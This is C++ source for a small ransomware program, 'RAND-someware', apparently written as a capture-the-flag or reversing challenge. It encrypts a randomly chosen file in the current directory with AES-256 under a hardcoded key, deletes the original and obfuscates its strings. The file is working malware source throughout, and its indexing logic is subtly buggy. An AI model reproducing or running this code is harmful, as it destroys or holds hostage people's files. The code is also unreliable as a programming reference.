#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <filesystem>
#include <algorithm>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <cstdio>
#include <obfuscation.h>
#include <time.h>

namespace fs = std::filesystem;

const int BUFF_SIZE = 1024;

std::wstring getCurPath() {
    TCHAR buffer[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, buffer);
    return std::wstring(buffer);
}

int enc(const unsigned char *key, const unsigned char *IV) {
    unsigned char buffer[BUFF_SIZE];
    unsigned char ciphertext[BUFF_SIZE];
    int len; 
    srand(time(NULL));

    std::wstring pathname = getCurPath();

    // buffer overflow could exist here
    std::string directory_contents[256];
    int c = 0;
    for (auto const& dir_entry : fs::directory_iterator(pathname)) {
        directory_contents[c] = std::string(dir_entry.path().u8string());
        c += 1;
    }
    int randFile = rand() % (c + 1);
    //int randFile = 1;

    std::ifstream f(directory_contents[randFile], std::ios::binary);
    std::ofstream output_file(directory_contents[randFile]+".enc", std::ios::binary);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, IV);

    while (f) {
        f.read((char*)buffer, BUFF_SIZE);
        int bread = f.gcount();
        EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, bread);
        output_file.write((const char*)ciphertext, len);
    }

    EVP_EncryptFinal_ex(ctx, ciphertext, &len);
    output_file.write((const char*)ciphertext, len);
    
    EVP_CIPHER_CTX_free(ctx);
    f.close(); output_file.close();
    std::remove(directory_contents[randFile].c_str());
    return 0;
}

//TODO: add function that takes a hash of the 'flag' string and prints it to console... this will force the string onto the stack
// obsfucate with vs-obsfucation

int main(int argc, char** argv) {
    if (argv[1]) {
        printf(XorString("USAGE: run RAND-someware from the directory you want to randomly encrypt a file in\n RAND-someware uses AES encryption to do the nasty stuff -- as the operator you should remember your hardcoded key, else you can always pull it from the binary ;)\n\n"));
        exit(0);
    }
    // hard coding them parameters
    const unsigned char key[32] = { '\x2e','\x79','\x6f','\x75','\x74','\x75','\x62','\x65','\x2e','\x63','\x6f','\x6d','\x2f','\x77','\x61','\x74','\x63',
                        '\x68','\x3f','\x76','\x3d','\x48','\x69','\x38','\x48','\x6a','\x57','\x54','\x55','\x71','\x77','\x49' };
    const unsigned char IV[AES_BLOCK_SIZE] = { '\x52','\x65','\x61','\x6c','\x6c','\x79','\x42','\x61','\x64','\x49','\x56','\x65','\x63','\x74','\x6f','\x72' };
    enc(key, IV);
    printf(XorString("[!] FILES ENCRYPTED [!]"));
}